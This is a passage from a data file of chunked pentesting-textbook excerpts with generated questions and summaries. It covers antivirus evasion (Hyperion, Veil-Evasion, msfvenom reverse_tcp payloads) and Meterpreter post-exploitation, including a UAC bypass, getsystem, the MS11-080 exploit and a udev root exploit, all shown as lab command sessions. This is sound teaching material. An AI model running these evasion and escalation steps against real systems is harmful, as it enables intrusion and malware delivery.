pentest. What’s going on? As it turns out, Hyperion greatly reduces the possible keyspace for the\nencryption key, which means that binaries encrypted with it shouldn’t be\nconsidered cryptographically secure. However, because our goal and the\ngoal of the Hyperion authors is to obfuscate the code to bypass antivirus\ndetection, the fact that the key can be brute-forced is not a problem. Let’s start by using Hyperion to encrypt at simple Meterpreter executable\nwith no additional antivirus avoidance techniques, as shown in Listing 12-8. (We installed Hyperion in Chapter 1 on page 21). root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -f exe >\nmeterpreter.exe\nroot@kali:~# cd Hyperion-1.0/\nroot@kali:~/Hyperion-1.0# wine ../hyperion ../meterpreter.exe bypassavhyperion.exeu\nOpening ../bypassav.exe\nCopied file to memory: 0x117178\n--snip--\nExecuting fasm.exe\nflat assembler version 1.69.31\n5 passes, 0.4 seconds, 92672 bytes. Listing 12-8: Running Hyperion\nBypassing Antivirus Applications 269\nHyperion was written to run on Windows systems, but we can run it\non Kali Linux with the Wine program, as you can see in Listing 12-8. Be\nsure to change into the Hyperion directory created when you unzipped the\nsource before running hyperion.exe with Wine. Hyperion takes two arguments: the name of the file to encrypt and\nthe name of the encrypted output file. Run Hyperion to encrypt the\nsimple Meterpreter executable as shown at u. The resulting file is in the\nHyperion 1.0 directory, so upload it to VirusTotal from there. Using just a Meterpreter executable generated with Msfvenom (with\nno encoding, custom templates, or anything else) and encrypting it with\nHyperion resulted in 27 antivirus programs in VirusTotal detecting the\nmalicious behavior. That’s not our lowest detection rate yet, but we have\nfinally achieved our goal. As shown in Figure 12-8, Microsoft Security\nEssentials did not detect any malicious activity! Figure 12-8: Microsoft Security Essentials does not detect malware. Sure enough, we can download and run the Hyperion-encrypted\nexecutable on the Windows 7 system with antivirus protection and get a\nMeterpreter session. We haven’t achieved a 0 percent detection rate—the\nholy grail for antivirus bypass researchers—but we have been able to meet\nour pentest goals. note To lower our detection rate even more, try combining Hyperion encryption with other\ntechniques from this section. For example, using Hyperion with a custom template\ndropped my detection number down to 14. Evading Antivirus with Veil-Evasion\nEven though we have successfully reached our goal of bypassing Microsoft\nSecurity Essentials on Windows 7, the antivirus landscape changes rapidly,\nso it is worthwhile to keep abreast of the latest tools and techniques. Veil-\nEvasion is a Python framework that automates creating antivirus-evading\npayloads, giving users the choice of multiple techniques. We covered install-\ning Veil-Evasion on Kali Linux in Chapter 1 on page 21; refer back if you\nneed a refresher. note As updates are made to Veil-Evasion, your version may be different from what is\nshown here. 270 Chapter 12\nPython Shellcode Injection with Windows aPIs\nPreviously we looked at using a custom C template to compile and execute\nshellcode. We can do something similar with Python’s Ctypes library, which\ngives us access to Windows API function calls and can create C-compatible\ndata types. We can use Ctypes to access the Windows API VirtualAlloc, which\ncreates a new executable memory region for the shellcode and locks the\nmemory region in physical memory, to avoid a page fault as shellcode is cop-\nied in and executed. RtlMoveMemory is used to copy the shellcode bytes into\nthe memory region created by VirtualAlloc. The CreateThread API creates a\nnew thread to run the shellcode, and finally, WaitForSingleObject waits until\nthe created thread is finished and our shellcode has finished running. These steps collectively are referred to as the VirtualAlloc injection\nmethod. This method, of course, would give us a Python script rather than\na Windows executable, but you can use multiple tools to convert a Python\nscript into a stand-alone executable. Creating Encrypted Python-Generated Executables with Veil-Evasion\nOne of the methods implemented in Veil-Evasion uses the Python injec-\ntion technique described earlier. To provide further antivirus protection,\nVeil-Evasion can use encryption. For our example, we will use Python\nVirtualAlloc injection combined with AES encryption, as we did in the\nHyperion example earlier in this chapter. To start Veil-Evasion, change directories to Veil-Evasion-master and run\n./Veil-Evasion.py.",
    "question": "What are the techniques used to obscure Metasploit payloads and avoid detection by antivirus applications?",
    "summary": "The text explains how to use the Social-Engineer Toolkit (SET) to perform phishing attacks by sending malicious files via email or creating fake websites to trick users into revealing credentials. It also discusses techniques to bypass antivirus detection, such as embedding Metasploit payloads in legitimate executables, encoding the payload, and using custom templates or encryption methods like Hyperion or Veil-Evasion. These methods help reduce the chances of the malicious file being detected by antivirus software."
  },
  {
    "start": 80,
    "end": 92,
    "text": "You should be presented with a menu-based prompt similar\nto those we saw in SET in the previous chapter, as shown in List ing 12-9. root@kali:~/Veil-Evasion-master# ./Veil-Evasion.py\n========================================================================\nVeil-Evasion | [Version]: 2.6.0\n========================================================================\n[Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework\n========================================================================\nMain Menu\n28 payloads loaded\nAvailable commands:\nuse use a specific payload\ninfo information on a specific payload\nlist list available payloads\nupdate update Veil to the latest version\nclean clean out payload folders\ncheckvt check payload hashes vs. VirusTotal\nexit exit Veil\nListing 12-9: Running Veil\nBypassing Antivirus Applications 271\nTo see all the available payloads in Veil-Evasion, enter list at the\nprompt, as shown in Listing 12-10. [>] Please enter a command: list\nAvailable payloads:\n1) auxiliary/coldwar_wrapper\n2) auxiliary/pyinstaller_wrapper\n--snip--\n22) python/meterpreter/rev_tcp\nu23) python/shellcode_inject/aes_encrypt\n24) python/shellcode_inject/arc_encrypt\n25) python/shellcode_inject/base64_substitution\n26) python/shellcode_inject/des_encrypt\n27) python/shellcode_inject/flat\n28) python/shellcode_inject/letter_substitution\nListing 12-10: Veil-Evasion payloads\nAs of this writing, there are 28 ways to create executables implemented in\nVeil-Evasion. For this example, choose option 23 u to use the VirtualAlloc\ninjection method and encrypt it with AES encryption. Once you choose a\nmethod, Veil-Evasion will prompt you to change the method options from the\ndefault, if desired, as shown in Listing 12-11. [>] Please enter a command: 23\nPayload: python/shellcode_inject/aes_encrypt loaded\nRequired Options:\nName Current Value Description\n---- ------------- -----------\nucompile_to_exe Y Compile to an executable\nexpire_paylo X Optional: Payloads expire after \"X\" days\nvinject_method Virtual Virtual, Void, Heap\nuse_pyherion N Use the pyherion encrypter\nAvailable commands:\nset set a specific option value\ninfo show information about the payload\ngenerate generate payload\nback go to the main menu\nexit exit Veil\nListing 12-11: Using Python VirtualAlloc in Veil-Evasion\n272 Chapter 12\nBy default, this payload will compile the Python script into an execut-\nable u using VirtualAlloc() as the injection method v. These options are\ncorrect for our example, so enter generate at the prompt. You are then\nprompted for details about the shellcode, as shown in Listing 12-12. [?] Use msfvenom or supply custom shellcode? 1 - msfvenom (default)\n2 - Custom\n[>] Please enter the number of your choice: 1\n[*] Press [enter] for windows/meterpreter/reverse_tcp\n[*] Press [tab] to list available payloads\n[>] Please enter metasploit payload:\n[>] Enter value for 'LHOST', [tab] for local IP: 192.168.20.9\n[>] Enter value for 'LPORT': 2345\n[>] Enter extra msfvenom options in OPTION=value syntax:\n[*] Generating shellcode... [*] Press [enter] for 'payload'\n[>] Please enter the base name for output files: meterpreterveil\n[?] How would you like to create your payload executable? 1 - Pyinstaller (default)\n2 - Py2Exe\n[>] Please enter the number of your choice: 1\n--snip--\n[*] Executable written to: /root/veil-output/compiled/meterpreterveil.exe\nLanguage: python\nPayload: AESEncrypted\nShellcode: windows/meterpreter/reverse_tcp\nOptions: LHOST=192.168.20.9 LPORT=2345\nRequired Options: compile_to_exe=Y inject_method=virtual use_pyherion=N\nPayload File: /root/veil-output/source/meterpreterveil.py\nHandler File: /root/veil-output/handlers/meterpreterveil_handler.rc\n[*] Your payload files have been generated, don't get caught! [!] And don't submit samples to any online scanner! ;)\nListing 12-12: Generating the executable in Veil-Evasion\nVeil-Evasion prompts you to select either Msfvenom to generate\nthe shellcode or to provide custom shellcode. For our purposes, choose\nMsfvenom. The default payload is windows/meterpreter/reverse_tcp, so press\nenter to select it. You should be prompted for the usual options, LHOST and\nBypassing Antivirus Applications 273\nLPORT, and for a filename for the generated executable. Finally, Veil-Evasion\noffers two Python to executable methods. Choose the default, Pyinstaller,\nto have Veil-Evasion generate the malicious executable and save it to the\nveil-output/compiled directory. As of this writing, the resulting executable sails right past Microsoft\nSecurity Essentials on our Windows 7 box. Veil-Evasion notes that you\nshouldn’t upload the resulting executable to online scanners, so at the\nauthor’s request we’ll forgo checking this example with VirusTotal. However, we can install other antivirus solutions besides Microsoft\nSecurity Essentials to see if the executable is flagged. note If you find the Veil-Evasion executables aren’t working, you might need to update\nMetasploit with Msfupdate. Since Veil-Evasion is not currently in the Kali Linux\nrepos, the latest version you pull down when you set up may not match up with how\nMsfvenom works in the default Kali 1.0.6 install. Of course, if you update Metasploit\nwith Msfupdate, other exercises in this book may change, as Metasploit’s functional-\nity changes frequently. Therefore, you may want to save this exercise for a second pass\nthrough the book or use a second Kali Linux image if you don’t want the update to\naffect later exercises in the book. hiding in Plain sight\nPerhaps the best way to avoid antivirus programs is to avoid traditional pay-\nloads altogether. If you are familiar with coding for Windows, you can use\nWindows APIs to mimic the functionality of a payload. There is, of course, no\nrule that legitimate applications cannot open a TCP connection to another\nsystem and send data—essentially what our windows/meterpreter/reverse_tcp\npayload is doing. You may find that instead of generating the payload with Msfvenom and\nattempting to hide it with the methods covered in this chapter, you get even\nbetter results just writing a C program that performs the payload function-\nality you want. You can even invest in a code-signing certificate to sign your\nbinary executable, to make it look even more legitimate. note Turn Real-time protection in Microsoft Security Essentials back off before moving on\nto post exploitation. summary\nWe’ve looked at only a few techniques for bypassing antivirus detection in\nthis chapter. The topic of bypassing antivirus solutions could take up an\nentire book, and by the time it was published, the book would already be\nwildly out of date. Pentesters and researchers are constantly coming up with\nnew techniques to sneak past antivirus detection, and antivirus vendors are\nalways adding new signatures and heuristics to catch them. 274 Chapter 12\nWe looked at ways to use Metasploit to encode and embed payloads\nin legitimate executables. When we found that these techniques weren’t\nenough to evade Microsoft Security Essentials, we turned to techniques\nbeyond Metasploit. We built a custom executable template and found that\nwe were able to improve our results by combining techniques. We were finally able to reach our goal of bypassing Microsoft Security\nEssentials using Hyperion. Though we never reached a 0 percent detection\nrate, we were able to bypass Microsoft Security Essentials as well as several\nother top antivirus solutions. We also looked at another tool, Veil-Evasion,\nwhich uses VirtualAlloc injection combined with encryption for even better\nevasion. Having looked at a lot of ways to get onto systems, even ones without\nreadily apparent vulnerabilities, we’ll now turn our attention to what we can\ndo once we penetrate a system, as we enter the post-exploitation stage of\npentesting. Bypassing Antivirus Applications 275\n13\nPost e xPloitation\nWe’ve gained access to our target systems, so our pen-\netration test is over, right? We can tell our client that\nwe got a shell on their systems. But so what? Why would the client care? In the post-exploitation phase, we will look at information gathering\non the exploited systems, privilege escalation, and moving from system to\nsystem. Perhaps we’ll find that we can access sensitive data stored on the\nexploited system or that we have network access to additional systems that\nwe can use to gain further access to company data. Maybe the exploited\nsystem is part of a domain, and we can use it to access other systems on the\ndomain. These are just a few of the potential avenues open to us in post\nexploitation. Post exploitation is arguably the most important way to get a clear pic-\nture of a client’s security posture. For example, in Chapter 9, I mentioned a\npentest in which I used access to a decommissioned Windows 2000 domain\ncontroller to gain complete administrative control over a domain. If I hadn’t\nused post-exploitation techniques, I might have instead concluded that the\nWindows 2000 system stored no sensitive information and that it wasn’t\nconnected to other systems in a domain. My pentest would not have been\nnearly as successful, and my client wouldn’t have gotten as good of a picture\nof their vulnerabilities, especially when it came to password policies. This chapter will cover the basics of post exploitation. As you move\nbeyond this book and increase your skills as a pentester, you should spend\na good deal of time on post exploitation. Solid post-exploitation skills dif-\nferentiate good pentesters from the truly great. Now let’s look at some of our post-exploitation options in Metasploit. meterpreter\nWe discussed Meterpreter, Metasploit’s custom payload, in Chapter 8. Now\nlet’s dig deeper and look at some of Meterpreter’s functionality. We’ll begin post exploitation by opening a Meterpreter session on each\nof our target systems. As you can see in Listing 13-1, I have a session on the\nWindows XP target from the MS08-067 exploit. On the Windows 7 target,\nI used a trojan executable like those we used in the previous chapter. On\nthe Linux target, I used the TikiWiki PHP vulnerability we exploited in\nChapter 8. You can also log in to the Linux target via SSH using either the\npassword for georgia we cracked in Chapter 9 (password) or the SSH public\nkey we added in Chapter 8 using the open NFS share. msf > sessions -l\nActive sessions\n===============\nId Type Information Connection\n-- ---- ----------- ----------\n1 meterpreter x86/win32 NT AUTHORITY\\SYSTEM @ BOOKXP 192.168.20.9:4444 ->\n\n192.168.20.10:1104\n(192.168.20.10)\n2 meterpreter x86/win32 Book-Win7\\Georgia Weidman @ Book-Win7 192.168.20.9:2345 ->\n\n192.168.20.12:49264\n(192.168.20.12)\n3 meterpreter php/php www-data (33) @ ubuntu 192.168.20.9:4444 ->\n\n192.168.20.11:48308\n(192.168.20.11)\nListing 13-1: Open Metasploit sessions on our targets\nStart by interacting with your Windows XP session as shown here.\nmsf post(enum_logged_on_users) > sessions -i 1\nWe’ve already seen a couple of Meterpreter commands throughout the\nbook. Namely, in Chapter 9, we used hashdump to get direct access to local\npassword hashes in on “Offline Password Attacks” on page 203. To see a\nlist of available Meterpreter commands, enter help in the Meterpreter con-\nsole. For more details about a specific command, enter command -h.\n278 Chapter 13\nUsing the upload Command\nPerhaps nothing is quite so annoying on a pentest as finding yourself on a\nWindows machine without access to utilities such as wget and curl to pull\ndown files from a web server. In Chapter 8, we saw a way to bypass this\nproblem with TFTP, but Meterpreter easily solves the problem for us. With\na simple command, help upload, we can upload files to the target, as shown\nin Listing 13-2.\nmeterpreter > help upload\nUsage: upload [options] src1 src2 src3 ... destination\nUploads local files and directories to the remote machine.\n\nOPTIONS:\n-h Help banner.\n-r Upload recursively.\nListing 13-2: Meterpreter help command\nThis help information tells us that we can use upload to copy files from\nour Kali system to the Windows XP target.\nFor example, here’s how to upload Netcat for Windows:\nmeterpreter > upload /usr/share/windows-binaries/nc.exe C:\\\\\n[*] uploading : /usr/share/windows-binaries/nc.exe -> C:\\\n[*] uploaded : /usr/share/windows-binaries/nc.exe -> C:\\\\nc.exe\nnote Remember to escape the backslash characters in the path with a second backslash. Also\nremember that if you upload anything to a target during a pentest or otherwise change\nthe target system, record your changes so you can undo them before the engagement\nis over. The last thing you want to do is leave an environment more vulnerable than\nwhen you found it.\ngetuid\nAnother useful Meterpreter command is getuid. This command will tell you\nthe name of the System user running Meterpreter. Typically, Meterpreter runs\nwith the privileges of the exploited process or user.\nFor example, when we exploit an SMB server with the MS08-067 exploit,\nwe’re running on the target with the privileges of the SMB server, namely\nthe Windows System account, as shown here.\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nOn the Windows 7 target, we social-engineered the user into running a\ntrojaned program that connected back to Metasploit, so Meterpreter is run-\nning as the user Georgia Weidman.\nPost Exploitation 279\nOther Meterpreter Commands\nBefore moving on, take some time to work with additional Meterpreter\ncommands. You’ll find many useful commands for local information gath-\nering, remote control, and even spying on local users, such as keylogging\nand turning on a webcam from a Meterpreter session.\nmeterpreter scripts\nIn addition to Meterpreter commands, you can also run Meterpreter scripts\nfrom a Meterpreter console. The scripts currently available can be found\nin Kali at /usr/share/metasploit-framework/scripts/meterpreter. These scripts are\nwritten in Ruby, and you can write your own and submit them for inclusion\nin the framework. To use a Meterpreter script, enter run <script name>. Use\nthe -h flag to see help information for a script.\nWhen exploiting Internet Explorer in Chapter 10, we used the\nAutoRunScript option to automatically run the migrate script to spawn a new\nprocess and migrate into it before the browser crashed. We can run this script\ndirectly inside Meterpreter as well. For example, entering run migrate -h, as\nshown in Listing 13-3, gives us information on the migrate Meterpreter\nscript.\nmeterpreter > run migrate -h\n\nOPTIONS:\n-f Launch a process and migrate into the new process\n-h Help menu.\n-k Kill original process.\n-n <opt> Migrate into the first process with this executable name\n(explorer.exe)\n-p <opt> PID to migrate to.\nListing 13-3: Migrate script help information\nBecause we’re not racing to beat a session before it closes, we have a\nfew different options for which process to migrate to. We can migrate to a\nprocess by name using the -n option. For example, to migrate to the first\ninstance of explorer.exe that Meterpreter encounters in the process list, we\ncan use -n explorer.exe.\nYou can also migrate to a process by using its process ID (PID) with the\n-p option. Use Meterpreter’s ps command to see a list of running processes,\nas shown in Listing 13-4.\n280 Chapter 13\nmeterpreter > ps\nProcess List\n============\nPID PPID Name Arch Session User Path\n--- ---- ---- ---- ------- ---- ----\n0 0 [System Process] 4294967295\n4 0 System x86 0 NT AUTHORITY\\SYSTEM\n--snip--\n1144 1712 explorer.exe x86 0 BOOKXP\\georgia C:\\WINDOWS\\Explorer.EXE\n--snip--\n1204 1100 wscntfy.exe x86 0 BOOKXP\\georgia\nListing 13-4: Running process list\nExplorer.exe is a solid choice. Choose PID 1144 for explorer.exe, and run the\nMeterpreter migrate script as shown in Listing 13-5.\nmeterpreter > run migrate -p 1144\n[*] Migrating from 1100 to 1144...\n[*] Migration completed successfully.\nmeterpreter > getuid\nServer username: BOOKXP\\georgia\nListing 13-5: Running the migrate script\nMeterpreter successfully migrates into the explorer.exe process. Now if\nthe SMB server happens to become unstable or die, our Meterpreter session\nis safe.\nIf you ran the getuid command again, you would see that we are no lon-\nger running as the System user but as user georgia. This makes sense because\nthis process belongs to the logged-in user georgia. By moving into this pro-\ncess, we’ve effectively dropped our privileges down to user georgia.\nLet’s stay logged in as user georgia on the XP target and look at some\nways to elevate our privileges to System on Windows targets and root on the\nLinux target through local privilege-escalation attacks.\nmetasploit Post-exploitation modules\nSo far we’ve used Metasploit modules for information gathering, vulnerabil-\nity identification, and exploitation. It should come as no surprise that the\nframework has a plethora of useful modules for the post-exploitation phase\nas well. Metasploit’s post directory contains modules for local information\ngathering, remote control, privilege escalation, and so on, which span mul-\ntiple platforms.\nPost Exploitation 281\nFor example, consider the module post/windows/gather/enum_logged_\non_users. As shown in Listing 13-6, this module will show us which users\nare currently logged on to the target system. Put your session in the back-\nground (with ctrl-Z or background) to return to the main Msfconsole\nprompt.\nmsf > use post/windows/gather/enum_logged_on_users\nmsf post(enum_logged_on_users) > show options\nModule options (post/windows/gather/enum_logged_on_users):\nName Current Setting Required Description\n---- --------------- -------- -----------\nCURRENT true yes Enumerate currently logged on users\nRECENT true yes Enumerate Recently logged on users\nuSESSION yes The session to run this module on.\nmsf post(enum_logged_on_users) > set SESSION 1\nSESSION => 1\nmsf post(enum_logged_on_users) > exploit\n[*] Running against session 1\nCurrent Logged Users\n====================\nSID User\n--- ----\nS-1-5-21-299502267-308236825-682003330-1003 BOOKXP\\georgia\n[*] Results saved in: /root/.msf4/loot/20140324121217_default_192.168.20.10_host.users.activ\n_791806.txt v\nRecently Logged Users\n=====================\nSID Profile Path\n--- ------------\nS-1-5-18 %systemroot%\\system32\\config\\systemprofile\nS-1-5-19 %SystemDrive%\\Documents and Settings\\LocalService\nS-1-5-20 %SystemDrive%\\Documents and Settings\\NetworkService\nS-1-5-21-299502267-308236825-682003330-1003 %SystemDrive%\\Documents and Settings\\georgia\nListing 13-6: Running a Metasploit post module\nWe use post modules as we do all Metasploit modules: We set the rel-\nevant options, and then enter exploit to run the module. However, in the\ncase of post-exploitation modules, instead of setting an RHOST or SRVHOST, we\nneed to tell Metasploit the Session ID we want to run the post-exploitation\nmodule against u. We then run the module against Session 1, the Windows\nXP target.\n282 Chapter 13\nThe module returns data telling us the user georgia is currently\nlogged in. Metasploit automatically saves the output to a file /root/ .msf4/\nloot/20140324121217_default_192.168.20.10_host.users.activ_791806.txt v.\nrailgun\nRailgun is an extension for Meterpreter that allows direct access to Windows\nAPIs. It can be used inside post-exploitation modules for Meterpreter as well\nas the Ruby shell (irb) in a Meterpreter session. For example, we can check\nif the session is running as an administrative user by directly accessing the\nIsUserAnAdmin function of the shell32 Windows DLL, as shown here. Be sure to\nbring a session to the foreground with sessions -i <session id> first.\nmeterpreter > irb\n[*] Starting IRB shell\n[*] The 'client' variable holds the meterpreter client\n>> client.railgun.shell32.IsUserAnAdmin\n=> {\"GetLastError\"=>0, \"Error Message\"=>\"The operation completed successfully.\", \"return\"=>true}\nFirst, we drop into a Ruby shell with the command irb. Note that the\nclient variable holds the Meterpreter client. Next we enter client.railgun\n.shell32.IsUserAnAdmin to tell the Ruby interpreter to use Railgun on the cur-\nrent Meterpreter session and access the IsUserAdmin function of shell32.dll. (For\nadditional Railgun examples, check out Metasploit post modules such as\nwindows/gather/reverse_lookup.rb and windows/manage/download_exec.rb, which\nalso leverage this functionality.) Enter exit to drop out of the Ruby interpreter\nand return to Meterpreter.\nLocal Privilege escalation\nIn the following sections, we’ll explore examples of local privilege escalation,\nwhich involves running exploits to gain additional control of the system\nafter exploitation.\nJust like network software and client-side software, privileged local\nprocesses can be subject to exploitable security issues. Some of your attacks\nmay not result in gaining the privileges you would like. Gaining command\nexecution through a website, compromising a user account without admin-\nistrative rights, or exploiting a listening service with limited privileges can\nall lead to system access, but you may find yourself still working as a limited\nuser. To get the privileges we want, we will need to exploit further issues.\ngetsystem on Windows\nMeterpreter’s getsystem command automates trying a series of known local\nprivilege-escalation exploits against the target. The command’s options are\nshown in Listing 13-7.\nPost Exploitation 283\nmeterpreter > getsystem -h\nUsage: getsystem [options]\nAttempt to elevate your privilege to that of local system.\n\nOPTIONS:\n-h Help Banner.\n-t <opt> The technique to use. (Default to '0').\n0 : All techniques available\n1 : Service - Named Pipe Impersonation (In Memory/Admin)\n2 : Service - Named Pipe Impersonation (Dropper/Admin)\n3 : Service - Token Duplication (In Memory/Admin)\nListing 13-7: getsystem help\nAs shown here, running getsystem with no arguments will run a series\nof local exploits until one succeeds or all known exploits are exhausted. To\nrun a particular exploit, use the -t option followed by the exploit number.\nHere we run getsystem on our Windows XP target with no arguments.\nmeterpreter > getsystem\n...got system (via technique 1).\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nAs you can see, Meterpreter gained system privileges with the first\nexploit it tried. With one command, we are able to elevate our privileges\nfrom georgia to System.\nLocal Escalation Module for Windows\nLocal exploit modules in Metasploit allow you to run an exploit on an\nopen session to gain additional access. The local privilege-escalation\nmodule exploit/windows/local/ms11_080_afdjoinleaf in Listing 13-8 exploits\na (now-patched) flaw in the Afdjoinleaf function of the afd.sys Windows\ndriver. Like post-exploitation modules, use the SESSION option to denote\nwhich open session the exploit should be run against. We’ll run the module\nagainst our Windows XP session. Unlike post modules, local exploits are\nexploits, so we’ll need to set a payload. If it succeeds, our exploit will open a\nnew session with System privileges. In your Windows XP Meterpreter ses-\nsion, run the command rev2self to drop back down to the user georgia\nbefore using this alternative privilege-escalation technique.\nmsf post(enum_logged_on_users) > use exploit/windows/local/ms11_080_afdjoinleaf\nmsf exploit(ms11_080_afdjoinleaf) > show options\nModule options (exploit/windows/local/ms11_080_afdjoinleaf):\nName Current Setting Required Description\n---- --------------- -------- -----------\nSESSION yes The session to run this module on.\n284 Chapter 13\n--snip--\nmsf exploit(ms11_080_afdjoinleaf) > set SESSION 1\nSESSION => 1\nmsf exploit(ms11_080_afdjoinleaf) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(ms11_080_afdjoinleaf) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(ms11_080_afdjoinleaf) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Running against Windows XP SP2 / SP3\n--snip--\n[*] Writing 290 bytes at address 0x00f70000\n[*] Sending stage (751104 bytes) to 192.168.20.10\n[*] Restoring the original token...\n[*] Meterpreter session 4 opened (192.168.20.9:4444 -> 192.168.20.10:1108) at\n2015-08-14 01:59:46 -0400\nmeterpreter >\nListing 13-8: Metasploit local exploit\nAfter you enter exploit, Metasploit runs the exploit in our Windows XP\nsession. If it succeeds, you should receive another Meterpreter session. If\nyou run getuid on this new session, you should see that you’ve once again\nobtained System privileges.\nnote Remember, to succeed, local privilege-escalation attacks rely on a flaw such as a\nmissing patch or security misconfiguration. A fully updated and locked-down system\nwould not be vulnerable to the MS11-08 exploit because a vendor patch was released\nin 2011.\nBypassing UAC on Windows\nNow let’s see how to escalate our privileges on our more secure Windows 7\ntarget, which has additional security features including user account control\n(UAC). Applications running on Windows Vista and higher are limited to\nusing regular user privileges. If an application needs to use administra-\ntive privileges, an administrative user has to approve the elevation. (You’ve\nprobably seen the warning notice from UAC when an application wants to\nmake changes.)\nBecause we gained this session by having user Georgia Weidman run\na malicious binary, the Meterpreter session currently has the privileges\nof Georgia Weidman. Try using getsystem against this target, as shown in\nListing 13-9.\nmsf exploit(ms11_080_afdjoinleaf) > sessions -i 2\n[*] Starting interaction with 2...\nmeterpreter > getuid\nPost Exploitation 285\nServer username: Book-Win7\\Georgia Weidman\nmeterpreter > getsystem\n[-] priv_elevate_getsystem: Operation failed: Access is denied.\nListing 13-9: getsystem fails on Windows 7\nAs you can see, running getsystem against this target fails and gives an\nerror message. Perhaps this system is fully patched and hardened to the\npoint where none of the exploitation techniques in getsystem will work.\nBut as it turns out, our Windows 7 target has not been patched since\ninstallation; UAC is stopping getsystem from working properly.\nAs with any computer security control, researchers have developed mul-\ntiple techniques to bypass the UAC control. One such technique is included\nin Metasploit in the local exploit windows/local/bypassuac. Background\nthe session and run this exploit on your Windows 7 session, as shown in\nListing 13-10. Use the exploit module, set the SESSION option, and so on.\nmsf exploit(ms11_080_afdjoinleaf) > use exploit/windows/local/bypassuac\nmsf exploit(bypassuac) > show options\nModule options (exploit/windows/local/bypassuac):\nName Current Setting Required Description\n---- --------------- -------- -----------\nSESSION yes The session to run this module\nmsf exploit(bypassuac) > set SESSION 2\nSESSION => 2\nmsf exploit(bypassuac) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] UAC is Enabled, checking level...\n--snip--\n[*] Uploaded the agent to the filesystem....\n[*] Sending stage (751104 bytes) to 192.168.20.12\n[*] Meterpreter session 5 opened (192.168.20.9:4444 -> 192.168.20.12:49265) at\n2015-08-14 02:17:05 -0400\n[-] Exploit failed: Rex::TimeoutError Operation timed out. u\nmeterpreter > getuid\nServer username: Book-Win7\\Georgia Weidman\nListing 13-10: Using a module to bypass the UAC control\nThe module uses a trusted publisher certificate through process injec-\ntion to bypass the UAC controls. As you can see from the results of the\ngetuid command, though our new session is still running as user Georgia\nWeidman, we’re no longer restricted by UAC. If it was successful you will\nagain be presented with a new session. Don’t worry if you see the line at u.\nAs long as the new Meterpreter session opens, the attack was successful.\nAs shown next, having gotten UAC out of the way, getsystem has no\ntrouble gaining system privileges.\n286 Chapter 13\nmeterpreter > getsystem\n...got system (via technique 1).\nUdev Privilege Escalation on Linux\nWe have yet to try privilege escalation on our Linux target. Let’s mix things\nup a bit and use public exploit code instead of Metasploit to perform a local\nprivilege-escalation attack on Linux.\nWe have two ways to interact with our Linux target: via SSH and by\nusing the TikiWiki to gain a Meterpreter shell. The Linux Meterpreter has\nfewer available commands than Windows Meterpreter, but in both cases we\nuse the shell command to drop out of Meterpreter and into a regular com-\nmand shell, as shown in Listing 13-11.\nmeterpreter > shell\nProcess 13857 created.\nChannel 0 created.\nwhoami\nwww-data\nListing 13-11: Dropping to a shell in Meterpreter\nWe see that our TikiWiki exploit gained us a session as the user\nwww-data, a limited account for the web server, but we have a long way to\nget to root. We have also gained a Bash shell as the user georgia through\nSSH in Chapter 8 with more privileges than www-data, but we’re still not\nthe coveted root.\nFinding a Vulnerability\nWe need to find a local privilege-escalation vulnerability to exploit. First, we\nneed a bit of information about the local system, such as the version of the\ninstalled kernel and the Ubuntu version. You can find out the Linux kernel\nversion with the command uname -a and the Ubuntu release version with the\ncommand lsb_release -a, as shown in Listing 13-12.\nuname -a\nLinux ubuntu 2.6.27-7-generic #1 SMP Fri Oct 24 06:42:44 UTC 2008 i686 GNU/Linux\nlsb_release -a\nDistributor ID: Ubuntu\nDescription: Ubuntu 8.10\nRelease: 8.10\nCodename: intrepid\nListing 13-12: Gathering local information\nThe Linux target is running Linux kernel 2.6.27-2 and Ubuntu 8.10,\ncodename Intrepid. This Linux system is a bit out of date and is vulnerable\nPost Exploitation 287\nto multiple known privilege-escalation issues. We’ll focus on an issue in\nudev, the device manager for the Linux kernel that is in charge of loading\ndevice drivers, or software that facilitates control of a device.\nVulnerability CVE-2009-1185 describes an issue in udev where the\ndaemon, which runs with root privileges, fails to check whether requests to\nload drivers originate from the kernel. Processes in user space, such as ones\nthat a user starts, can send messages to udev and convince it to run code\nwith root privileges.\nAccording to the SecurityFocus.com entry for this vulnerability, Ubuntu\n\n8.10 is an affected platform, and further digging reveals that udev versions\n141 and earlier are affected by this issue. We can check the udev version on\nour target with the command udevadm --version, but we can’t run the com-\nmand with the privileges afforded by www-data. Instead, we need to run it\nfrom our SSH shell as shown here.\ngeorgia@ubuntu:~$ udevadm --version\n124\nThe udev version on our target, 124, is earlier than 141, which tells us\nthat our Linux target is vulnerable.\nFinding an Exploit\nKali Linux includes a local repository of public exploit code from Exploitdb\n.com at /usr/share/exploitdb, which includes a utility called searchsploit that\nwe can use to search for useful code. For example, Listing 13-13 shows the\nresults of a search for exploits related to udev.\nroot@kali:~# /usr/share/exploitdb/searchsploit udev\nDescription Path\n---------------------------------------------------------------------- ----------------------\nLinux Kernel 2.6 UDEV Local Privilege Escalation Exploit /linux/local/8478.sh\nLinux Kernel 2.6 UDEV < 141 Local Privilege Escalation Exploit /linux/local/8572.c\nLinux udev Netlink Local Privilege Escalation /linux/local/21848.rb\nListing 13-13: Searching the Exploitdb repository\nThere appear to be multiple public exploits for this issue. Let’s use the\nsecond exploit, /usr/share/exploitdb/platforms/linux/local/8572.c.\nnote Always be sure that you fully understand what public exploit code does before running\nit against a target. Additionally, there is always a chance that a public exploit won’t\nrun reliably on the target. If possible, set up a lab machine, and test the quality of the\nexploit before you try it on the client target.\nOne of the great things about this exploit is that it’s well commented\nand provides detailed usage information. Listing 13-14 shows an excerpt\nfrom its C code, which includes usage details.\n288 Chapter 13\n* Usage:\n* Pass the PID of the udevd netlink socket (listed in /proc/net/netlink,\n* usually is the udevd PID minus 1) as argv[1].\n* The exploit will execute /tmp/run as root so throw whatever payload you\n* want in there.\nListing 13-14: Udev exploit usage information\nWe learn that we need to pass the PID of the udev netlink socket as an\nargument to our exploit. The usage information tells us to look for this\nvalue in /proc/net/netlink, usually as udev PID minus 1. We also see that the\nexploit will run whatever code it finds in the file /tmp/run as root, so we\nneed to put 